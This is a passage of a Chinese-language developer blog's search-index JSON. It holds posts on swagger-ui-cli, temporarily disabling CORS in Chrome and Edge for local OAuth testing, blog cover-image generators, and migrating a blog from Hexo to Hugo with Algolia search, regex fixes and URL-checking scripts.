","date":"2022-10-24","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-swagger-ui-cli-%E5%B7%A5%E5%85%B7%E7%9C%8B-OpenAPI-%E6%96%87%E4%BB%B6%E8%88%87%E6%B8%AC%E8%A9%A6/:2:0","tags":["swaggerui","openapi","Net Core"],"title":"使用 swagger-ui-cli 工具看 OpenAPI 文件與測試","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-swagger-ui-cli-%E5%B7%A5%E5%85%B7%E7%9C%8B-OpenAPI-%E6%96%87%E4%BB%B6%E8%88%87%E6%B8%AC%E8%A9%A6/"},{"categories":["實用工具"],"content":"番外 Pull Request 人生第一次用工具發現工具有問題，想說不應該發生這個問題就跑去看原始碼，第一次發現問題自己修正，然後 Pull Request 成功被 Merge 進去，第一次加進去 Contributors 有莫名其妙榮譽感(雖然 Star 數不多的)，但是我還是很高興，不知道有沒有機會拿到PULL SHARK 徽章? 確定拿不到，因為要有 2個 Pull Request。不知道有生之年還有沒有第二次機會。 參考:How to get PULL SHARK acheivement? · Discussion #20357 · community/community ","date":"2022-10-24","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-swagger-ui-cli-%E5%B7%A5%E5%85%B7%E7%9C%8B-OpenAPI-%E6%96%87%E4%BB%B6%E8%88%87%E6%B8%AC%E8%A9%A6/:3:0","tags":["swaggerui","openapi","Net Core"],"title":"使用 swagger-ui-cli 工具看 OpenAPI 文件與測試","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-swagger-ui-cli-%E5%B7%A5%E5%85%B7%E7%9C%8B-OpenAPI-%E6%96%87%E4%BB%B6%E8%88%87%E6%B8%AC%E8%A9%A6/"},{"categories":["Chrome"],"content":"最近嘗試設定 OpenAPI 文件設定 OAuth2 的 authorization code 的設定，發現沒法正常使用，我發現是跨域問題，因為 VSCode 的產生 swagger ui 不能做 authorization code(但第四個 flow 可以跑)，用程式產生 swagger ui 的可以正常，但卡在瀏覽器跨域問題。 這邊我原本還想用 Electron 來實作關掉 CORS東西，但我覺得這樣花費很多成本，可能還要針對瀏覽器設置，相關套件也不是很想用，之前有用過 Agent Switch 疑似套件有放奇怪的東西，所以想避免使用套件 ","date":"2022-10-24","objectID":"/blog/posts/Chrome-%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8-CORS-%E8%B7%A8%E5%9F%9F%E6%AA%A2%E6%9F%A5/:0:0","tags":["實用工具"],"title":"Chrome 設定停用 CORS 跨域檢查","uri":"/blog/posts/Chrome-%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8-CORS-%E8%B7%A8%E5%9F%9F%E6%AA%A2%E6%9F%A5/"},{"categories":["Chrome"],"content":"安全性設置 Disable-web-security in Chrome 48+ - Stack Overflow 浏览器允许跨域设置（不用于生产环境，开发用） - LiuChunfu - 博客园 # MacOS (in Terminal) open -na Google\\ Chrome --args --user-data-dir=/tmp/temporary-chrome-profile-dir --disable-web-security --disable-site-isolation-trials # Windows (from \"Run\" dialog [Windows+R] or start menu in Windows 8+) chrome.exe --user-data-dir=%TMP%\\temporary-chrome-profile-dir --disable-web-security --disable-site-isolation-trials 使用上面執行指令就能解決問題。寫這篇主要目的是要用 swagger-ui-cli，如果有興趣可以參考這篇 ","date":"2022-10-24","objectID":"/blog/posts/Chrome-%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8-CORS-%E8%B7%A8%E5%9F%9F%E6%AA%A2%E6%9F%A5/:1:0","tags":["實用工具"],"title":"Chrome 設定停用 CORS 跨域檢查","uri":"/blog/posts/Chrome-%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8-CORS-%E8%B7%A8%E5%9F%9F%E6%AA%A2%E6%9F%A5/"},{"categories":["Chrome"],"content":"Edge 使用方法 # 在桌面建立 Edge 捷徑，右鍵屬性內容路徑加上` --disable-web-security --user-data-dir=C:\\MyChromeDevUserData` \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --disable-web-security --user-data-dir=C:\\MyChromeDevUserData 參考: * Google Chrome和Microsoft Edge开发环境跨域的设置_edge –disable-web-security_追逐梦想之路_随笔的博客-CSDN博客 ","date":"2022-10-24","objectID":"/blog/posts/Chrome-%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8-CORS-%E8%B7%A8%E5%9F%9F%E6%AA%A2%E6%9F%A5/:2:0","tags":["實用工具"],"title":"Chrome 設定停用 CORS 跨域檢查","uri":"/blog/posts/Chrome-%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8-CORS-%E8%B7%A8%E5%9F%9F%E6%AA%A2%E6%9F%A5/"},{"categories":["Blog"],"content":"Blog 文章封面產生器 - 整理兩個文章封面產生器","date":"2022-10-20","objectID":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/","tags":["blog"],"title":"Blog 文章封面產生器","uri":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/"},{"categories":["Blog"],"content":"最近看 LoveIt 主題內容，文章可以放個預覽圖，我就想嘗試看看，找了一些有用工具試試。 ","date":"2022-10-20","objectID":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/:0:0","tags":["blog"],"title":"Blog 文章封面產生器","uri":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/"},{"categories":["Blog"],"content":"Coverview Coverview - Creating cover images for your blogs is now super easy 來源Coverview - 部落格文章封面圖片產生器，自訂標題作者與背景顏色圖片，免費下載 PNG 格式封面縮圖 - TechMoon 科技月球這篇文章。 這個是免費開源的工具，簡單就能做，裡面有很多程式 Icon，還滿適合寫程式 Blog用，缺點功能還滿一般，不太能自定排版，但我覺得利大於弊。這篇文章就是用這個產生器。 專案原始碼在這rutikwankhade/CoverView: 🛠 Create awesome cover images for your blog posts quickly.，假如之後網站掛點也能自己架設。 這篇文章就是用這個做。 ","date":"2022-10-20","objectID":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/:1:0","tags":["blog"],"title":"Blog 文章封面產生器","uri":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/"},{"categories":["Blog"],"content":"Adobe Spark Adobe Spark 上篇文章有用這個，上面介紹 Coverview 像我前面有用到這個。hexo,hugo這兩個東西很難用 Coverview 來特別設置工具。所以我就嘗試用這個，不過大多圖片都是付費才能用，在使用圖片上建議還是小心使用。 也有其他工具，可參考這篇免費設計工具：製作簡報、影片、社交媒體 | Canva ","date":"2022-10-20","objectID":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/:2:0","tags":["blog"],"title":"Blog 文章封面產生器","uri":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/"},{"categories":["Blog"],"content":"製作心得 因為主要我用在 Blog 上面，我 Blog 使用 LoveIt 主題，他有提供文章預覽圖方法。最近就想使用看看。雖然都是品質不佳文章。 預覽圖可以用兩張，假如懶得化可以用一張圖。但需要注意重點文字需要靠中間。 首頁顯示文章會是這樣。 我發現文章放圖，就不會注意標題文字，這個容易吸引到使用者瀏覽清單，快速看到文章標題，可以快速近來，所以文章標題應該要放大顯示。 ","date":"2022-10-20","objectID":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/:2:1","tags":["blog"],"title":"Blog 文章封面產生器","uri":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/"},{"categories":["Blog"],"content":"LoveIt 官方預覽圖設定 看官方某篇文張看到圖片竟然有不會至中，我很好奇是怎麼做到的，我這篇簡單看一下。 結果是用兩張圖用的。可以參考範例 Github 目錄。LoveIt/exampleSite/content/posts/theme-documentation-extended-shortcodes at master · dillonzq/LoveIt --- weight: 4 title: \"Theme Documentation - Extended Shortcodes\" date: 2020-03-03T16:29:41+08:00 lastmod: 2020-06-12T10:10:13+03:00 draft: false author: \"Dillon\" authorLink: \"https://dillonzq.com\" description: \"LoveIt theme provides multiple shortcodes on top of built-in ones in Hugo.\" images: [] resources: - name: \"featured-image\" src: \"featured-image.jpg\" - name: \"featured-image-preview\" src: \"featured-image-preview.jpg\" ","date":"2022-10-20","objectID":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/:2:2","tags":["blog"],"title":"Blog 文章封面產生器","uri":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/"},{"categories":["Blog"],"content":"其他 Blog 怎麼做圖 大部分有些不會放圖，有些會放萌圖，有些放動物，有些還特別做圖片，最近換 LoveIt 想說嘗試看看這樣做，看 Youtuber 建立影片都會特別做影片圖片，雖然小網站也沒賺什麼錢，但我覺得可以先嘗試看看。 ","date":"2022-10-20","objectID":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/:3:0","tags":["blog"],"title":"Blog 文章封面產生器","uri":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/"},{"categories":["Blog"],"content":"其他 Blog 參考 底下放個有經營 Blog 可參考他們怎麼做圖片 Morris’ Blog 動畫圖 布丁布丁吃什麼？ 自己做圖 小惡魔 - AppleBOY - 小惡魔 - AppleBOY 相關圖(或吉祥物圖) 卡斯伯 Blog - 前端，沒有極限 自己做圖 ","date":"2022-10-20","objectID":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/:3:1","tags":["blog"],"title":"Blog 文章封面產生器","uri":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/"},{"categories":["Blog"],"content":"彩蛋 AlternativeTo - Crowdsourced software recommendations Piqsels - Millions of stunning royalty free photos 剛好這篇有缺素材可以用這個，但有些圖片是有版權的，我也不確定這個網站貼的圖示不是真的免費?使用上還是小心一點。 ","date":"2022-10-20","objectID":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/:4:0","tags":["blog"],"title":"Blog 文章封面產生器","uri":"/blog/posts/Blog-%E6%96%87%E7%AB%A0%E5%B0%81%E9%9D%A2%E7%94%A2%E7%94%9F%E5%99%A8/"},{"categories":["Hugo"],"content":"從 Hexo 移轉 Hugo，也有調整相關設定，如: MermaidJS、Algolia Search...，還有自動化設定上傳到 Github Pages。相關設定可以讓你從 Hexo 到 Hugo 做參考","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"從過去用 Logdown 到現在用 Hexo 做程式筆記，我覺得他們都是很好用工具。再更久以前有用過 Blogspot，不過那時候沒有寫 Blog。最近因為文章大概700多個，Hexo build程式都要3~5分鐘，上個廁所回來還沒跑完，我覺得太久了，有時候我覺得還卡住。以前也有觀察 Hugo 這個東西，但發現沒有像 hexo 自動 deploy 到 Github Page上面，現在 Github Action 也能做到，所以也沒有這個問題。最近想換換 Hugo 看看，build 網頁只要 3~10 秒就完成，讓我很驚訝。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:0:0","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"建立 Hugo 這邊可以參考官網安裝 hugo，Install Hugo | Hugo。我是用 choco 來安裝的。 # 新增站台 hugo new site Blog # Add a Theme cd Blog git init git submodule add https://github.com/malagege/LoveIt.git themes/LoveIt # config.toml 下加入 theme = \"LoveIt\" vim config.toml # 從 LoveIt 的 config.toml 內容複製到 hugo 的config.toml 下 themes\\LoveIt\\config.toml =\u003e config.toml # 新增一筆文章 hugo new posts/my-first-post.md ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:1:0","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"Visual Studio Code 設定圖片方法 這邊查看有什麼套件可以用圖片，但沒有完美方法，因為 Hugo 顯示圖片要放在資料夾上面，但你的markdown文件不在裡面，你放圖片只能[](xxxx)，不能加圖片錄徑。這邊就沒法在 vsCode預覽，但可以在 Hugo 預覽。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:2:0","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"設定在 blog 裡面 參考: 配置Hugo的图片路径 - happyhacker的公开日志 使用vscode来写hugo博客并处理图片插入问题 - 张理坤的博客 - 运维技术分享 有兩種方法 一種設定 static 資料夾 在文章旁邊設定資料夾(我選擇這種) 安裝 Paste Image套件。 Paste Image: Path ${currentFileDir}/${currentFileNameWithoutExt} Paste Image: Insert Pattern ${imageSyntaxPrefix}${imageFileName}${imageSyntaxSuffix} 接下來你可以在 VSCode 編輯文字上面按下Ctrl + Alt + v 可以貼上圖片。對應路徑會參照上方設定。但相對缺點會如上。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:2:1","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"使用圖床空間 可以使用PicGo，但我沒用過。因為我現在很常先在 HakMD 先編寫內容再貼到 Blog 上面，所以圖片貼上都會幫我用 Imgur圖床空間，之前保哥也有建議使用 Github Gist之類東西。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:2:2","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"搜尋文章工具選擇 官方能用搜尋的可參考Search for your Hugo Website | Hugo文章。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:3:0","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"LoveIt 支援搜尋 lunr Algolia 這邊我會以 Algolia 為主。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:3:1","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"前面準備事情 簡單寫個重點。 需要注冊 Algolia 帳號。 在 Algolia 新增一個 Index。 需手動或自動產生 Index 上傳到 Algolia。這一部分好像也能用爬蟲?，但我擺在部署到 Github Pages 在研究。 LoveIt 主題有幫我們用好 index.json，但需要設定打開才會產生。 參考文章: 构建更优的 GitHub Action 完成 Algolia 数据上传 - 谷中仁的博客 两天后 - 还是决定将搜索更换为algolia - 暗夜零星 Hugo 博客如何更新 Algolia 索引 :: /dev/ttyS3 — 回首向来萧瑟处 也无荒野也无灯 Hugo 基于 DocSearch 实现全文搜索 Hugo使用algolia搜索 - 哥斯拉的小站 博客迁移 - Raven Hugo使用添加algolia搜索 - FAKEV Hugo添加Algolia搜索 - ISouthRain ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:3:2","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"設定 Algolia 網站 這邊可能會隨者網站更新有所不同。 註冊/登入 填寫相關資訊。 新增 Index 上傳 Index 這邊部分有很種方法，官方用 API 上傳方法可以看Importing with the API | Algolia。這邊我們 LoveIt 主題可以產生 Index.json。我們把那個設定打開。 [outputs] home = [\"HTML\", \"RSS\", \"JSON\"] 參考: 主题文档 - 基本概念 - LoveIt hugo public/index.json就會產生 index.json。 這邊上傳限制有 10000。我 Blog 有 700多篇，但是http://localhost:1313/blog/index.json看有 3101，應該還夠用吧?? 上傳完成會倒去 Dashbord。 繼續設定搜尋 這些步驟還沒好。請點擊火箭圖案。 這邊我大概設定這樣。 排序設定我設定這樣。 設定 LoveIt 主題 注意，這顛要看你的主題有支援那些搜尋，依照設定做調整。 [params.search.algolia] index appID searchKey index appId searchKey 自動更新就放在部署 Github Pages。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:3:3","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"主題選擇 試用主題 ananke eureka maupassant PaperMode 普通還可以看 next 我的文章會bluid 失敗，所以就放棄使用 loveit 讚讚讚!! even 精簡，但對我覺得太少功能了 所以我最後選擇 LoveIt。 Hugo系列(3.0) - LoveIt主题美化与博客功能增强 · 第一章 - Yulin Lewis’ Blog ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:4:0","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"Hexo 調整 Hugo 內容 我這邊盡量讓我的舊網頁還能繼續用，雖然網站有放廣告，一個月下來大概最多才1美元，剛開始的時候每個月 0.01 美元，不太想回到過去那時候，想說讓舊網頁不引響情況下使用。最近看 LoveIt 主題有做很多優化搜尋東西，這邊也順便設定，看以後新網址搜尋分數也很高的話，再把舊網址移除也不遲。 這邊後來有看到将博客从Hexo迁移至Hugo - 老孙正经胡说，裡面有 python 程式做文章轉換，假如想用程式處理的話，可以試試看，我這邊是用 VSCode 做正規化取代掉。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:5:0","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"解決文章沒換行問題 早期文章我沒很寫文章句子，近期有改正，但是面對以前那些文章不太想去調整，hugo預設不是 Hard Break Line，好在我找到修改方式。 config.toml [markup.goldmark.renderer] hardWraps = true 可參考: Hugo Framework | 蛋餅的競程隨筆 Markdown not adding a when adding a line break - support - HUGO ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:5:1","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"文章錯誤排除 Hexo 文章有寫 bug 不會嚴格檢查格式。但換成 hugo 可能會有些編譯錯誤狀況，可能以前相關標籤寫錯之類，調整掉就能解決。這邊放上我一些錯誤調整搜尋，可以用 vsCode 或 Sublime 取代。Hugo 的 tags 和 categories 是要放陣列。 # regex tags: ([^\\[ ].+) # replace tags: [$1] # regex categories:\\s+(.+) # replace categories: [$1] # regex ```(.+) # replace ```$1 早期 logdown 日期時間格式調整 # regex date: (\\d{4}-\\d+-\\d+ \\d+:\\d+) # replace date: $1:00 hexo 特製mermaid tag 手動更換。還好不多… \\{% ?asset_img (.+) \\[?(.+?)\\]? *%\\} ![$2]($1) \\{% ?asset_link \"?([^\"]+)\"? \\[?\"?(.+?)\\]?\"? *%\\} [$2]($1) ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:5:2","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"mermaid 套用問題 官方有使用 MermaidJS教學，這邊官網友教學Diagrams | Hugo。但我後來用 LoveIt 主題，裡面有內建 Hexo Next theme 加入 mermaid 圖示(Diagrams) | 中文測試222 \u003cdiv class=\"nested-copy-line-height lh-copy {{ $.Param \"post_content_classes\" | default \"serif\"}} f4 nested-links {{ $.Param \"text_color\" | default \"mid-gray\" }} {{ cond (eq $.Site.Language.LanguageDirection \"rtl\") \"pl4-l\" \"pr4-l\" }} w-two-thirds-l\"\u003e {{- .Content -}} {{ if .Page.Store.Get \"hasMermaid\" }} \u003cscript src=\"https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js\"\u003e\u003c/script\u003e \u003cscript\u003e mermaid.initialize({ startOnLoad: true }); \u003c/script\u003e {{ end }} 不過可以直接用我的 Fork 修改主題就能用了。malagege/LoveIt: ❤️A clean, elegant but advanced blog theme for Hugo 一个简洁、优雅且高效的 Hugo 主题 官方有說後續會調可以用，但我先用萬用方法去調整。可前後相容。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:5:3","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"舊文章網頁完整搬移 有看到網址改成 Next 文章渲染網址，但是我發現我部分網站連結會跟之前不一樣，試了很多種方式， 因為 hexo 產生 url 規則完全不相容，嘗試很多設定。和無法解決問題，不如就直接靜態網頁搬過來繼續使用，測試上是可以的，所以考慮就聞張先這樣用。以後SEO比較好說不定可以把就網站刪掉。 此方法非完美解決方法，最後殺手鐧可以試試。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:5:4","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"檢查網站連結程式 簡單就是用來檢查之前文章 url，是不是轉移網址還能正常瀏覽。如果不在意這點可以不用做。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:0","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"hugo 子目錄 URL 調整 要順利開啟 http://localhost:1313/blog/要下面這樣設定。 baseURL = 'http://example.org/blog' ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:1","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"抓取路徑 參考: C#: 使用 AngleSharp 爬蟲工具來抓取網頁內容吧 | 伊果的沒人看筆記本 不要說我程式怎麼寫得不好，可以跑就 100分。 var url = $\"https://malagege.github.io/blog/\"; var result = new List\u003cstring\u003e(); var config = AngleSharp.Configuration.Default.WithDefaultLoader( new LoaderOptions { IsResourceLoadingEnabled = true }); var browser = BrowsingContext.New(config); var document = await browser.OpenAsync(url); var data = document?.QuerySelectorAll(\".post-title-link\"); document.Close(); var matchString = data.Select(s =\u003e s.GetAttribute(\"Href\")).ToList();//(s =\u003e s.BaseUrl.Origin + s.GetAttribute(\"Href\")).ToList(); result.AddRange(matchString); for (int i = 2; i \u003c 75; i++) { Thread.Sleep(3000); document = await browser.OpenAsync(url + \"page/\" + i); data = document?.QuerySelectorAll(\".post-title-link\"); document.Close(); matchString = data.Select(s =\u003e s.GetAttribute(\"Href\")).ToList(); result.AddRange(matchString); Console.WriteLine($\"i:{i}, cnt: {matchString.Count}\"); } result.Dump(); 結果還發現我有些頁面會有問題。 ","date":"2022-10-18","objectID":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/:6:2","tags":["blog","hexo","hugo","loveit"],"title":"Blog 從 Hexo 移轉 Hugo 主題 LoveIt","uri":"/blog/posts/Blog-%E5%BE%9E-Hexo-%E7%A7%BB%E8%BD%89-Hugo-%E4%B8%BB%E9%A1%8C-LoveIt/"},{"categories":["Hugo"],"content":"檢查網站路徑程式 參考: Bash script using curl to hit urls provided by txt file - Stack Overflow Checking lots of URLs with curl – alexwlchan 準備路徑 urls.txt 就可以執行。 #!/bin/bash BASE_URL=\"${BASE_URL:-http://localhost:8080}\" ERRORS=0 for path in $(grep ^/ urls.txt) do url=\"$BASE_URL$path\" echo -n \"Checking $url... \" STATUS_CODE=$(curl \\ --output /dev/null \\ --silent \\ --write-out \"%{http_code}\" \\ \"$url\") if (( STATUS_CODE == 200 )) then echo \"$STATUS_CODE\" else echo -e \"\\033[0;31m$STATUS_CODE !!!\\033[m\" ERRORS=$(( ERRORS + 1 )) fi done if (( ERRORS != 0 )) then echo -e \"\\033[0;31m!!! Errors checking URLs!\\033[m\" exit 1 fi 